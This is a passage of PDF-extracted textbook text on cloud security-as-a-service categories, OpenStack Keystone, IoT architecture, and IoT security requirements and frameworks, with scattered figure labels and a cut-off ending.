+\\r\\nHypervisor/OS/\\r\\nNetwork\\r\\nVirtual\\r\\nmachine\\r\\nApplication\\r\\nApplication\\r\\nClient Client\\r\\nApplication +\\r\\nMiddleware +\\r\\nHypervisor/OS/\\r\\nNetwork\\r\\nOS\\r\\nFacilities (network, housing, cooling, and power)\\r\\n(b) Cloud computing management tasks\\r\\nManage and protect supplies and facilities\\r\\n(power, cooling, cabling, guards, etc.) \\r\\nDeploy and maintain hardware\\r\\n(server racks, disks, routers, cables, etc.) \\r\\nProvider Customer\\r\\nIaaS PaaS SaaS\\r\\nManage user accounts, user permissions, etc.\\r\\nDeploy, update, and\\r\\npatch application software\\r\\nDeploy,\\r\\nupdate, and\\r\\npatch OS \\r\\nDeploy, update,\\r\\nand patch app\\r\\nsoftware\\r\\nDeploy, update, and patch hypervisor/OS/network\\r\\nDeploy, update, and patch\\r\\nmiddleware + libraries\\r\\nThe CSA defines SecaaS as the provision of security applications and services \\r\\nvia the cloud either to cloud-based infrastructure and software, or from the cloud to \\r\\nthe customers’ on-premise systems [CSA11]. The CSA has identified the following \\r\\nSecaaS categories of service:\\r\\n• Identity and access management\\r\\n• Data loss prevention\\r\\n• Web security\\r\\nM13_STAL0611_04_GE_C13.indd 461 10/11/17 3:08 PM\\n\\n\\n462 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\n• E-mail security\\r\\n• Security assessments\\r\\n• Intrusion management\\r\\n• Security information and event management\\r\\n• Encryption\\r\\n• Business continuity and disaster recovery\\r\\n• Network security\\r\\nIn this section, we examine these categories with a focus on security of the\\r\\ncloud-based infrastructure and services (see Figure 13.6).\\r\\nIdentity and access management (IAM) includes people, processes, and systems \\r\\nthat are used to manage access to enterprise resources by assuring that the identity \\r\\nof an entity is verified, then granting the correct level of access based on this assured \\r\\nidentity. One aspect of identity management is identity provisioning, which has to do \\r\\nwith providing access to identified users and subsequently deprovisioning, or denying \\r\\nFigure 13.6 Elements of Cloud Security as a Service\\r\\nCloud service clients and adversaries\\r\\nIdentity and access management\\r\\nNetwork security\\r\\nData loss\\r\\nprevention\\r\\nWeb security\\r\\nIntrusion\\r\\nmanagement\\r\\nEncryption\\r\\nE-mail security\\r\\nSecurity assessments\\r\\nSecurity information and\\r\\n event management\\r\\nBusiness continuity and\\r\\n disaster recovery\\r\\nM13_STAL0611_04_GE_C13.indd 462 10/11/17 3:08 PM\\n\\n\\n13.3 / CLOUD SECURITY APPROACHES 463\\r\\naccess, to users when the client enterprise designates such users as no longer having \\r\\naccess to enterprise resources in the cloud. Among other requirements, the cloud \\r\\nservice provider must be able to exchange identity attributes with the enterprise’s \\r\\nchosen identity provider.\\r\\nThe access management portion of IAM involves authentication and access \\r\\ncontrol services. For example, the CSP must be able to authenticate users in a trust\\ufffeworthy manner. The access control requirements in SPI environments include estab\\ufffelishing trusted user profile and policy information, using it to control access within \\r\\nthe cloud service, and doing this in an auditable way.\\r\\nData loss prevention (DLP) is the monitoring, protecting, and verifying the \\r\\nsecurity of data at rest, in motion, and in use. Much of DLP can be implemented by \\r\\nthe cloud client, such as discussed in previously in this section (Data Protection in the \\r\\nCloud). The CSP can also provide DLP services, such as implementing rules about \\r\\nwhat functions can be performed on data in various contexts.\\r\\nWeb security is real-time protection offered either on premise through soft\\ufffeware/appliance installation or via the cloud by proxying or redirecting Web traffic to \\r\\nthe CSP. This provides an added layer of protection on top of things like antiviruses \\r\\nto prevent malware from entering the enterprise via activities such as Web brows\\ufffeing. In addition to protecting against malware, a cloud-based Web security service \\r\\nmight include usage policy enforcement, data backup, traffic control, and Web access \\r\\ncontrol.\\r\\nA CSP may provide a Web-based e-mail service, for which security measures \\r\\nare needed. E-mail security provides control over inbound and outbound e-mail, pro\\ufffetecting the organization from phishing, malicious attachments, enforcing corporate \\r\\npolices such as acceptable use and spam prevention. The CSP may also incorporate \\r\\ndigital signatures on all e-mail clients and provide optional e-mail encryption.\\r\\nSecurity assessments are third-part audits of cloud services. While this service \\r\\nis outside the province of the CSP, the CSP can provide tools and access points to \\r\\nfacilitate various assessment activities.\\r\\nIntrusion management encompasses intrusion detection, prevention, and \\r\\nresponse. The core of this service is the implementation of intrusion detection systems \\r\\n(IDSs) and intrusion prevention systems (IPSs) at entry points to the cloud and on \\r\\nservers in the cloud. An IDS is a set of automated tools designed to detect unauthor\\ufffeized access to a host system. An IPS incorporates IDS functionality and in addition \\r\\nincludes mechanisms designed to block traffic from intruders.\\r\\nSecurity information and event management (SIEM) aggregates (via push or \\r\\npull mechanisms) log and event data from virtual and real networks, applications, and \\r\\nsystems. This information is then correlated and analyzed to provide real-time report\\ufffeing and alerting on information/events that may require intervention or other type \\r\\nof response. The CSP typically provides an integrated service that can put together \\r\\ninformation from a variety of sources both within the cloud and within the client \\r\\nenterprise network.\\r\\nEncryption is a pervasive service that can be provided for data at rest in the \\r\\ncloud, e-mail traffic, client-specific network management information, and identity \\r\\ninformation. Encryption services provided by the CSP involve a range of complex \\r\\nissues, including key management, how to implement virtual private network (VPN) \\r\\nservices in the cloud, application encryption, and data content access.\\r\\nM13_STAL0611_04_GE_C13.indd 463 10/11/17 3:08 PM\\n\\n\\n464 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\nBusiness continuity and disaster recovery comprise measures and mechanisms \\r\\nto ensure operational resiliency in the event of any service interruptions. This is an \\r\\narea where the CSP, because of economies of scale, can offer obvious benefits to a \\r\\ncloud service client. The CSP can provide backup at multiple locations, with reliable \\r\\nfailover and disaster recovery facilities. This service must include a flexible infrastruc\\ufffeture, redundancy of functions and hardware, monitored operations, geographically \\r\\ndistributed data centers, and network survivability.\\r\\nNetwork security consists of security services that allocate access, distribute, \\r\\nmonitor, and protect the underlying resource services. Services include perimeter and \\r\\nserver firewalls and denial-of-service protection. Many of the other services listed in \\r\\nthis section, including intrusion management, identity and access management, data \\r\\nloss protection, and Web security, also contribute to the network security service.\\r\\nAn Open-source Cloud Security Module\\r\\nThis section provides an overview of an open-source security module that is part \\r\\nof the OpenStack cloud OS. OpenStack is an open-source software project of the \\r\\nOpenStack Foundation that aims to produce an open-source cloud operating sys\\ufffetem [ROSA14, SEFR12]. The principal objective is to enable creating and managing \\r\\nhuge groups of virtual private servers in a cloud computing environment. OpenStack \\r\\nis embedded, to one degree or another, into data center infrastructure and cloud \\r\\ncomputing products offered by Cisco, IBM, Hewlett-Packard, and other vendors. It \\r\\nprovides multi-tenant IaaS, and aims to meets the needs of public and private clouds \\r\\nregardless of size, by being simple to implement and massively scalable.\\r\\nThe OpenStack OS consists of a number of independent modules, each of \\r\\nwhich has a project name and a functional name. The modular structure is easy to \\r\\nscale out and provides a commonly used set of core services. Typically, the compo\\ufffenents are configured together to provide a comprehensive IaaS capability. However, \\r\\nthe modular design is such that the components are generally capable of being used \\r\\nindependently.\\r\\nThe security module for OpenStack is Keystone. Keystone provides the shared \\r\\nsecurity services essential for a functioning cloud computing infrastructure. It pro\\ufffevides the following main services:\\r\\n• Identity: This is user information authentication. This information defines a \\r\\nuser’s role and permissions within a project, and is the basis for a role-based \\r\\naccess control (RBAC) mechanism. Keystone supports multiple methods of \\r\\nauthentication, including user name and password, Lightweight Directory \\r\\nAccess Protocol (LDAP), and a means of configuring external authentication \\r\\nmethods supplied by the CSC.\\r\\n• Token: After authentication, a token is assigned and used for access control. \\r\\nOpenStack services retain tokens and use them to query Keystone during \\r\\noperations.\\r\\n• Service catalog: OpenStack service endpoints are registered with Keystone to \\r\\ncreate a service catalog. A client for a service connects to Keystone and deter\\ufffemines an endpoint to call based on the returned catalog.\\r\\nM13_STAL0611_04_GE_C13.indd 464 10/11/17 3:08 PM\\n\\n\\n13.3 / CLOUD SECURITY APPROACHES 465\\r\\n• Policies: This service enforces different user access levels. Each OpenStack \\r\\nservice defines the access policies for its resources in an associated policy file. \\r\\nA resource, for example, could be API access, the ability to attach to a volume, \\r\\nor to fire up instances. These policies can be modified or updated by the cloud \\r\\nadministrator to control the access to the various resources.\\r\\nFigure 13.7 illustrates the way in which Keystone interacts with other Open\\ufffeStack components to launch a new VM. Nova is the management software module \\r\\nthat controls VMs within the IaaS cloud computing platform. It manages the lifecycle \\r\\nof compute instances in an OpenStack environment. Responsibilities include spawn\\ufffeing, scheduling, and decommissioning of machines on demand. Thus, Nova enables \\r\\nenterprises and service providers to offer on-demand computing resources by pro\\ufffevisioning and managing large networks of VMs. Glance is a lookup and retrieval \\r\\nsystem for VM disk images. It provides services for discovering, registering, and \\r\\nretrieving virtual images through an API. Swift is a distributed object store that \\r\\ncreates a redundant and scalable storage space of up to multiple petabytes of data. \\r\\nObject storage does not present a traditional file system, but rather a distributed \\r\\nstorage system for static data such as VM images, photo storage, e-mail storage, \\r\\nbackups, and archives.\\r\\nFigure 13.7 Launching a Virtual Machine in OpenStack\\r\\nNova\\r\\nScheduler\\r\\nNova\\r\\nScheduler\\r\\nSwift\\r\\nproxy\\r\\nSwift\\r\\nworker\\r\\n4. Schedule\\r\\nVM\\r\\n5. Receive\\r\\n launch VM\\r\\nmessage\\r\\n6. Request\\r\\nimage 8. Look up\\r\\nimage\\r\\n9. Return\\r\\nlocation &\\r\\nmetadata10. Request image\\r\\n13. Get image\\r\\n11. Find service,\\r\\ncheck credentials,\\r\\nrequest image\\r\\n7. Find service, check credentials,\\r\\nrequest image\\r\\n12. Get\\r\\nimage\\r\\n3. Launch\\r\\nVM\\r\\n14. Launch VM\\r\\n1. Launch VM\\r\\n2. Find service,\\r\\ncheck credentials,\\r\\nlaunch VM\\r\\nClient\\r\\nNova\\r\\ncompute\\r\\nNova\\r\\nmessage\\r\\nqueue\\r\\nKeystone\\r\\nGlance\\r\\nAPI\\r\\nGlance\\r\\nregistry\\r\\nM13_STAL0611_04_GE_C13.indd 465 10/11/17 3:08 PM\\n\\n\\n466 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\n13.4 THE INTERNET OF THINGS\\r\\nThe Internet of things is the latest development in the long and continuing revolu\\ufffetion of computing and communications. Its size, ubiquity, and influence on everyday \\r\\nlives, business, and government dwarf any technical advance that has gone before. \\r\\nThis section provides a brief overview of the Internet of things.\\r\\nThings on the Internet of Things\\r\\nThe Internet of things (IoT) is a term that refers to the expanding interconnection \\r\\nof smart devices, ranging from appliances to tiny sensors. A dominant theme is the \\r\\nembedding of short-range mobile transceivers into a wide array of gadgets and every\\ufffeday items, enabling new forms of communication between people and things, and \\r\\nbetween things themselves. The Internet now supports the interconnection of billions \\r\\nof industrial and personal objects, usually through cloud systems. The objects deliver \\r\\nsensor information, act on their environment, and in some cases modify themselves, \\r\\nto create overall management of a larger system, like a factory or city.\\r\\nThe IoT is primarily driven by deeply embedded devices. These devices are low\\ufffebandwidth, low-repetition data capture, and low-bandwidth data-usage appliances \\r\\nthat communicate with each other and provide data via user interfaces. Embedded \\r\\nappliances, such as high-resolution video security cameras, video VoIP phones, and a \\r\\nhandful of others, require high-bandwidth streaming capabilities. Yet countless prod\\ufffeucts simply require packets of data to be intermittently delivered.\\r\\nEvolution\\r\\nWith reference to the end systems supported, the Internet has gone through roughly \\r\\nfour generations of deployment culminating in the IoT:\\r\\n1. Information technology: PCs, servers, routers, firewalls, and so on, bought as \\r\\nIT devices by enterprise IT people, primarily using wired connectivity.\\r\\n2. Operational technology (OT): Machines/appliances with embedded IT built by \\r\\nnon-IT companies, such as medical machinery, SCADA (supervisory control and \\r\\ndata acquisition), process control, and kiosks, bought as appliances by enterprise \\r\\nOT people and primarily using wired connectivity.\\r\\n3. Personal technology: Smartphones, tablets, and eBook readers bought as \\r\\nIT devices by consumers (employees), exclusively using wireless connectivity and \\r\\noften multiple forms of wireless connectivity.\\r\\n4. Sensor/actuator technology: Single-purpose devices bought by consumers, IT, \\r\\nand OT people, exclusively using wireless connectivity, generally of a single \\r\\nform, as part of larger systems.\\r\\nThe fourth generation is usually thought of as the IoT, and which is marked by \\r\\nusing billions of embedded devices.\\r\\nComponents of IoT-enabled Things\\r\\nThe key components of an IoT-enabled device are the following (see Figure 13.8):\\r\\n• Sensor: A sensor measures some parameter of a physical, chemical, or bio\\ufffelogical entity and delivers an electronic signal proportional to the observed \\r\\nM13_STAL0611_04_GE_C13.indd 466 10/11/17 3:08 PM\\n\\n\\n13.4 / THE INTERNET OF THINGS 467\\r\\ncharacteristic, either in the form of an analog voltage level or a digital signal. \\r\\nIn both cases, the sensor output is typically input to a microcontroller or other \\r\\nmanagement element.\\r\\n• Actuator: An actuator receives an electronic signal from a controller and \\r\\nresponds by interacting with its environment to produce an effect on some \\r\\nparameter of a physical, chemical, or biological entity.\\r\\n• Microcontroller: The “smart” in a smart device is provided by a deeply embed\\ufffeded microcontroller.\\r\\n• Transceiver: A transceiver contains the electronics needed to transmit and \\r\\nreceive data. Most IoT devices contain a wireless transceiver, capable of com\\ufffemunication using Wi-Fi, ZigBee, or some other wireless scheme.\\r\\n• Radio-frequency Identification (RFID): (RFID) technology, which uses radio \\r\\nwaves to identify items, is increasingly becoming an enabling technology for IoT. \\r\\nThe main elements of an RFID system are tags and readers. RFID tags are small \\r\\nprogrammable devices used for object, animal, and human tracking. They come \\r\\nin a variety of shapes, sizes, functionalities, and costs. RFID readers acquire and \\r\\nsometimes rewrite information stored on RFID tags that come within operating \\r\\nrange (a few inches up to several feet). Readers are usually connected to a com\\ufffeputer system that records and formats the acquired information for further uses.\\r\\nIoT and Cloud Context\\r\\nTo better understand the function of an IoT, it is useful to view it in the context of a \\r\\ncomplete enterprise network that includes third-party networking and cloud comput\\ufffeing elements. Figure 13.9 provides an overview illustration.\\r\\nEDGE At the edge of a typical enterprise network is a network of IoT-enabled\\r\\ndevices, consisting of sensors and perhaps actuators. These devices may communicate \\r\\nFigure 13.8 IoT Components\\r\\nSensor\\r\\nTransceiver\\r\\nRFID\\r\\nActuator\\r\\nMicrocontroller\\r\\nIoT Device\\r\\nM13_STAL0611_04_GE_C13.indd 467 10/11/17 3:08 PM\\n\\n\\n468 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\nFigure 13.9 The IoT and Cloud Context\\r\\nCloud network /\\r\\nData centers\\r\\nEthernet\\r\\nTransactional\\r\\nresponse time\\r\\nCore network\\r\\nIP/MPLS, security\\r\\nQoS/QoE-driven\\r\\nresponse time\\r\\nFog network\\r\\n3G/4G/LTE/Wi-Fi\\r\\nDistributed intelligence\\r\\nReal-time response time\\r\\nEdge network of\\r\\nIOT devices\\r\\nBluetooth, WiFi, wired\\r\\nmillisecond response time\\r\\nNetwork management Applications\\r\\nMillions\\r\\nof devices\\r\\nTens of\\r\\nthousands\\r\\nof devices\\r\\nThousands\\r\\nof devices\\r\\nHundreds\\r\\nof devices\\r\\nwith one another. For example, a cluster of sensors may all transmit their data to one \\r\\nsensor that aggregates the data to be collected by a higher-level entity. At this level, \\r\\nthere may also be a number of gateways. A gateway interconnects the IoT-enabled \\r\\ndevices with the higher-level communication networks. It performs the necessary \\r\\ntranslation between the protocols used in the communication networks and those \\r\\nused by devices. A gateway may also perform a basic data aggregation function.\\r\\nFOG In many IoT deployments, massive amounts of data may be generated \\r\\nby a distributed network of sensors. For example, offshore oil fields and refin\\ufffeeries can generate a terabyte of data per day. An airplane can create multiple \\r\\nterabytes of data per hour. Rather than store all of that data permanently (or \\r\\nat least for a long period) in central storage accessible to IoT applications, it is \\r\\noften desirable to do as much data processing close to the sensors as possible. \\r\\nThus, the purpose of what is sometimes referred to as the edge computing level \\r\\nis to convert network data flows into information that is suitable for storage \\r\\nM13_STAL0611_04_GE_C13.indd 468 10/11/17 3:08 PM\\n\\n\\n13.4 / THE INTERNET OF THINGS 469\\r\\nand higher-level processing. Processing elements at these levels may deal with \\r\\nhigh volumes of data and perform data transformation operations, resulting in \\r\\nthe storage of much lower volumes of data. The following are examples of fog \\r\\ncomputing operations:\\r\\n• Evaluation: Evaluating data for criteria as to whether it should be processed \\r\\nat a higher level.\\r\\n• Formatting: Reformatting data for consistent higher-level processing.\\r\\n• Expanding/decoding: Handling cryptic data with additional context (such as\\r\\nthe origin).\\r\\n• Distillation/reduction: Reducing and/or summarizing data to minimize the \\r\\nimpact of data and traffic on the network and higher-level processing systems.\\r\\n• Assessment: Determining whether data represent a threshold or alert; this \\r\\ncould include redirecting data to additional destinations.\\r\\nGenerally, fog computing devices are deployed physically near the edge of the \\r\\nIoT network; that is, near the sensors and other data-generating devices. Thus, some \\r\\nof the basic processing of large volumes of generated data is offloaded and out\\ufffesourced from IoT application software located at the center of the network.\\r\\nFog computing and fog services are becoming a distinguishing characteris\\ufffetic of the IoT. Fog computing represents an opposite trend in modern network\\ufffeing from cloud computing. With cloud computing, massive, centralized storage \\r\\nand processing resources are made available to distributed customers over cloud \\r\\nnetworking facilities to a relatively small number of users. With fog computing, \\r\\nmassive numbers of individual smart objects are interconnected with fog net\\ufffeworking facilities that provide processing and storage resources close to the edge \\r\\ndevices in an IoT. Fog computing addresses the challenges raised by the activ\\ufffeity of thousand or millions of smart devices, including security, privacy, network \\r\\ncapacity constraints, and latency requirements. The term fog computing is inspired \\r\\nby the fact that fog tends to hover low to the ground, whereas clouds are high in \\r\\nthe sky.\\r\\nCORE The core network, also referred to as a backbone network, connects geo\\ufffegraphically dispersed fog networks as well as provides access to other networks \\r\\nthat are not part of the enterprise network. Typically, the core network will use \\r\\nvery high performance routers, high-capacity transmission lines, and multiple \\r\\ninterconnected routers for increased redundancy and capacity. The core network \\r\\nmay also connect to high-performance, high-capacity servers, such as large data\\ufffebase servers and private cloud facilities. Some of the core routers may be purely \\r\\ninternal, providing redundancy and additional capacity without serving as edge \\r\\nrouters.\\r\\nCLOUD The cloud network provides storage and processing capabilities for the mas\\ufffesive amounts of aggregated data that originate in IoT-enabled devices at the edge. \\r\\nCloud servers also host the applications that (1) interact with and manage the IoT \\r\\ndevices, and (2) analyze the IoT-generated data. Table 13.4 compares cloud and fog \\r\\ncomputing.\\r\\nM13_STAL0611_04_GE_C13.indd 469 10/11/17 3:08 PM\\n\\n\\n470 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\n13.5 IOT SECURITY\\r\\nIoT is perhaps the most complex and undeveloped area of network security. To \\r\\nsee this, consider Figure 13.10, which shows the main elements of interest for IoT \\r\\nsecurity. At the center of the network are the application platforms, data stor\\ufffeage servers, and network and security management systems. These central systems \\r\\ngather data from sensors, send control signals to actuators, and are responsible \\r\\nfor managing the IoT devices and their communication networks. At the edge of \\r\\nthe network are IoT-enabled devices, some of which are quite simple constrained \\r\\ndevices, and some of which are more intelligent unconstrained devices. As well, \\r\\ngateways may perform protocol conversion and other networking service on behalf \\r\\nof IoT devices.\\r\\nFigure 13.10 illustrates a number of typical scenarios for interconnection and \\r\\nthe inclusion of security features. The shading in Figure 13.10 indicates the systems \\r\\nthat support at least some of these functions. Typically, gateways will implement \\r\\nsecure functions, such as TLS and IPsec. Unconstrained devices may or may not \\r\\nimplement some security capability. Constrained devices generally have limited or no \\r\\nsecurity features. As suggested in the figure, gateway devices can provide secure com\\ufffemunication between the gateway and the devices at the center, such as application \\r\\nplatforms and management platforms. However, any constrained or unconstrained \\r\\ndevices attached to the gateway are outside the zone of security established between \\r\\nthe gateway and the central systems. As shown, unconstrained devices can commu\\ufffenicate directly with the center and support security functions. However, constrained \\r\\ndevices that are not connected to gateways have no secure communications with \\r\\ncentral devices.\\r\\nCloud Fog\\r\\nLocation of processing/storage \\r\\nresources\\r\\nCenter Edge\\r\\nLatency High Low\\r\\nAccess Fixed or wireless Mainly wireless\\r\\nSupport for mobility Not applicable Yes\\r\\nControl Centralized/hierarchical \\r\\n(full control)\\r\\nDistributed/hierarchical \\r\\n(partial control)\\r\\nService access Through core At the edge/on handheld device\\r\\nAvailability 99.99% Highly volatile/highly redundant\\r\\nNumber of users/devices Tens/hundreds of millions Tens of billions\\r\\nMain content generator Human Devices/sensors\\r\\nContent generation Central location Anywhere\\r\\nContent consumption End device Anywhere\\r\\nSoftware virtual infrastructure Central enterprise servers User devices\\r\\nTable 13.4 Comparison of Cloud and Fog Features\\r\\nM13_STAL0611_04_GE_C13.indd 470 10/11/17 3:08 PM\\n\\n\\n13.5 / IoT SECURITY 471\\r\\nFigure 13.10 IoT Security: Elements of Interest\\r\\nA\\r\\nInternet\\r\\nor\\r\\nEnterprise Network\\r\\nG\\r\\nG\\r\\nG\\r\\n= application,\\r\\nmanagement, or\\r\\nstorage platform\\r\\n= gateway\\r\\n= unconstrained\\r\\ndevice\\r\\n= constrained\\r\\ndevice\\r\\nshading = includes security features\\r\\nC\\r\\nC C C\\r\\nC\\r\\nC\\r\\nC\\r\\nC\\r\\nU\\r\\nU\\r\\nU\\r\\nU\\r\\nU\\r\\nU\\r\\nU\\r\\nU\\r\\nA\\r\\nA\\r\\nThe Patching Vulnerability\\r\\nIn an often-quoted 2014 article, security expert Bruce Schneier stated that we are at \\r\\na crisis point with regard to the security of embedded systems, including IoT devices \\r\\n[SCHN14]. The embedded devices are riddled with vulnerabilities and there is no \\r\\ngood way to patch them. The chip manufacturers have strong incentives to produce \\r\\ntheir product with its firmware and software as quickly and cheaply as possible. The \\r\\ndevice manufacturers choose a chip based on price and features and do very little \\r\\nif anything to the chip software and firmware. Their focus is the functionality of \\r\\nthe device itself. The end user may have no means of patching the system or, if so, little \\r\\ninformation about when and how to patch. The result is that the hundreds of millions \\r\\nof Internet-connected devices in the IoT are vulnerable to attack. This is certainly a \\r\\nproblem with sensors, allowing attackers to insert false data into the network. It is \\r\\npotentially a graver threat with actuators, where the attacker can affect the operation \\r\\nof machinery and other devices.\\r\\nIoT Security and Privacy Requirements Defined by ITU-T\\r\\nITU-T Recommendation Y.2066 (Common Requirements of the Internet of Things, \\r\\nJune 2014) includes a list of security requirements for the IoT. This list is a use\\ufffeful baseline for understanding the scope of security implementation needed for an \\r\\nIoT deployment. The requirements are defined as being the functional requirements \\r\\nM13_STAL0611_04_GE_C13.indd 471 10/11/17 3:08 PM\\n\\n\\n472 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\nduring capturing, storing, transferring, aggregating, and processing the data of things, \\r\\nas well as to the provision of services which involve things. These requirements are \\r\\nrelated to all the IoT actors. The requirements are the following:\\r\\n• Communication security: Secure, trusted, and privacy protected communica\\ufffetion capability is required, so unauthorized access to the content of data can be \\r\\nprohibited, integrity of data can be guaranteed and privacy-related content of \\r\\ndata can be protected during data transmission or transfer in IoT.\\r\\n• Data management security: Secure, trusted, and privacy protected data manage\\ufffement capability is required, so unauthorized access to the content of data can \\r\\nbe prohibited, integrity of data can be guaranteed, and privacy-related content \\r\\nof data can be protected when storing or processing data in IoT.\\r\\n• Service provision security: Secure, trusted, and privacy protected service provi\\ufffesion capability is required, so unauthorized access to service and fraudulent \\r\\nservice provision can be prohibited and privacy information related to IoT users \\r\\ncan be protected.\\r\\n• Integration of security policies and techniques: The ability to integrate different \\r\\nsecurity policies and techniques is required, so as to ensure a consistent security \\r\\ncontrol over the variety of devices and user networks in IoT.\\r\\n• Mutual authentication and authorization: Before a device (or an IoT user) can \\r\\naccess the IoT, mutual authentication and authorization between the device \\r\\n(or the IoT user) and IoT is required to be performed according to predefined \\r\\nsecurity policies.\\r\\n• Security audit: Security audit is required to be supported in IoT. Any data \\r\\naccess or attempt to access IoT applications are required to be fully transpar\\ufffeent, traceable and reproducible according to appropriate regulation and laws. \\r\\nIn particular, IoT is required to support security audit for data transmission, \\r\\nstorage, processing, and application access.\\r\\nA key element in providing security in an IoT deployment is the gateway. ITU-T \\r\\nRecommendation Y.2067 (Common Requirements and Capabilities of a Gateway for \\r\\nInternet of Things Applications, June 2014) details specific security functions that \\r\\nthe gateway should implement, some of which are illustrated in Figure 13.11. These \\r\\nconsist of the following:\\r\\n• Support identification of each access to the connected devices.\\r\\n• Support authentication with devices. Based on application requirements and \\r\\ndevice capabilities, it is required to support mutual or one-way authentication \\r\\nwith devices. With one-way authentication, either the device authenticates itself \\r\\nto the gateway or the gateway authenticates itself to the device, but not both.\\r\\n• Support mutual authentication with applications.\\r\\n• Support the security of the data that are stored in devices and the gateway, \\r\\nor transferred between the gateway and devices, or transferred between the \\r\\ngateway and applications. Support the security of these data based on security \\r\\nlevels.\\r\\n• Support mechanisms to protect privacy for devices and the gateway.\\r\\nM13_STAL0611_04_GE_C13.indd 472 10/11/17 3:08 PM\\n\\n\\n13.5 / IoT SECURITY 473\\r\\nFigure 13.11 IoT Gateway Security Functions\\r\\nDevices\\r\\nGateways\\r\\nInternet or\\r\\nenterprise\\r\\nnetwork\\r\\nApplication\\r\\nplatforms\\r\\nAuthentication\\r\\nsecure data transfer\\r\\nSecurity, privacy\\r\\nof data at rest\\r\\nAuthentication\\r\\nsecure data transfer\\r\\n• Support self-diagnosis and self-repair as well as remote maintenance.\\r\\n• Support firmware and software update.\\r\\n• Support auto configuration or configuration by applications. The gateway is \\r\\nrequired to support multiple configuration modes, for example, remote and \\r\\nlocal configuration, automatic and manual configuration, and dynamic configu\\uffferation based on policies.\\r\\nSome of these requirements may be difficult to achieve when they involve pro\\ufffeviding security services for constrained devices. For example, the gateway should \\r\\nsupport security of data stored in devices. Without encryption capability at the con\\ufffestrained device, this may be impractical to achieve.\\r\\nNote the Y.2067 requirements make a number of references to privacy require\\ufffements. Privacy is an area of growing concern with the widespread deployment of \\r\\nIoT-enabled things in homes, retail outlets, and vehicles and humans. As more things \\r\\nare interconnected, governments and private enterprises will collect massive amounts \\r\\nof data about individuals, including medical information, location and movement \\r\\ninformation, and application usage.\\r\\nM13_STAL0611_04_GE_C13.indd 473 10/11/17 3:08 PM\\n\\n\\n474 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\nAn IoT Security Framework\\r\\nCisco has developed a framework for IoT security [FRAH15] that serves as a use\\ufffeful guide to the security requirements for IoT. Figure 13.12 illustrates the security \\r\\nenvironment related to the logical structure of an IoT. The IoT model is a simplified \\r\\nversion of the World Forum IoT Reference Model. It consists of the following levels:\\r\\n• Smart objects/embedded systems: Consists of sensors, actuators, and other embed\\ufffeded systems at the edge of the network. This is the most vulnerable part of an \\r\\nIoT. The devices may not be in a physically secure environment and may need to \\r\\nfunction for years. Availability is certainly an issue. Network managers also need \\r\\nto be concerned about the authenticity and integrity of the data generated by \\r\\nsensors and about protecting actuators and other smart devices from unauthor\\ufffeized use. Privacy and protection from eavesdropping may also be requirements.\\r\\n• Fog/edge network: This level is concerned with the wired and wireless inter\\ufffeconnection of IoT devices. In addition, a certain amount of data processing \\r\\nand consolidation may be done at this level. A key issue of concern is the wide \\r\\nvariety of network technologies and protocols used by the various IoT devices \\r\\nand the need to develop and enforce a uniform security policy.\\r\\n• Core network: The core network level provides data paths between network \\r\\ncenter platforms and the IoT devices. The security issues here are those con\\ufffefronted in traditional core networks. However, the vast number of endpoints to \\r\\ninteract with and manage creates a substantial security burden.\\r\\n• Data center/cloud: This level contains the application, data storage, and net\\ufffework management platforms. IoT does not introduce any new security issues at \\r\\nthis level, other than the necessity of dealing with huge numbers of individual \\r\\nendpoints.\\r\\nWithin this four-level architecture, the Cisco model defines four general security \\r\\ncapabilities that span multiple levels:\\r\\n• Role-based security: RBAC systems assign access rights to roles instead of \\r\\nindividual users. In turn, users are assigned to different roles, either statically \\r\\nFigure 13.12 IoT Security Environment\\r\\nData Center/\\r\\nCloud\\r\\nCore\\r\\nNetwork\\r\\nFog\\r\\nNetwork\\r\\nSmart\\r\\nObjects\\r\\nData Center/\\r\\nCloud\\r\\nCore\\r\\nNetwork\\r\\nFog\\r\\nNetwork\\r\\nSmart\\r\\nObjects\\r\\nRole-based Security\\r\\nData Protection & Confidentiality\\r\\nIP Protection\\r\\nAnti-tamper and Detection\\r\\nM13_STAL0611_04_GE_C13.indd 474 10/11/17 3:08 PM\\n\\n\\n13.5 / IoT SECURITY 475\\r\\nor dynamically, according to their responsibilities. RBAC enjoys widespread \\r\\ncommercial use in cloud and enterprise systems and is a well-understood tool \\r\\nthat can be used to manage access to IoT devices and the data they generate.\\r\\n• Anti-tamper and detection:This function is particularly important at the device \\r\\nand fog network levels but also extends to the core network level. All of these \\r\\nlevels may involve components that are physically outside the area of the enter\\ufffeprise that is protected by physical security measures.\\r\\n• Data protection and confidentiality: These functions extend to all level of the \\r\\narchitecture.\\r\\n• Internet protocol protection: Protection of data in motion from eavesdropping \\r\\nand snooping is essential between all levels.\\r\\nFigure 13.12 maps specific security functional areas across the four layers of \\r\\nthe IoT model. [FRAH15] also proposes a secure IoT framework that defines the \\r\\ncomponents of a security facility for an IoT that encompasses all the levels, as shown \\r\\nin Figure 13.13. The four components are:\\r\\n• Authentication: Encompasses the elements that initiate the determination of \\r\\naccess by first identifying the IoT devices. In contrast to typical enterprise net\\ufffework devices, which may be identified by a human credential (e.g., username \\r\\nand password or token), the IoT endpoints must be fingerprinted by means \\r\\nthat do not require human interaction. Such identifiers include RFID, x.509 \\r\\ncertificates, or the MAC address of the endpoint.\\r\\n• Authorization: Controls a device’s access throughout the network fabric. This \\r\\nelement encompasses access control. Together with the authentication layer, \\r\\nit establishes the necessary parameters to enable the exchange of information \\r\\nFigure 13.13 Secure IoT Framework\\r\\nNetwork Enforced Policy\\r\\nSecure Analytics: Visibility and Control\\r\\nAuthorization\\r\\nAuthentication\\r\\nTrust Relationship\\r\\nM13_STAL0611_04_GE_C13.indd 475 10/11/17 3:08 PM\\n\\n\\n476 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\nbetween devices and between devices and application platforms and enables \\r\\nIoT-related services to be performed.\\r\\n• Network enforced policy: Encompasses all elements that route and transport \\r\\nendpoint traffic securely over the infrastructure, whether control, management, \\r\\nor actual data traffic.\\r\\n• Secure analytics, including visibility and control: This component includes all the \\r\\nfunctions required for central management of IoT devices. This involves, firstly, \\r\\nvisibility of IoT devices, which simply means that central management services \\r\\nare securely aware of 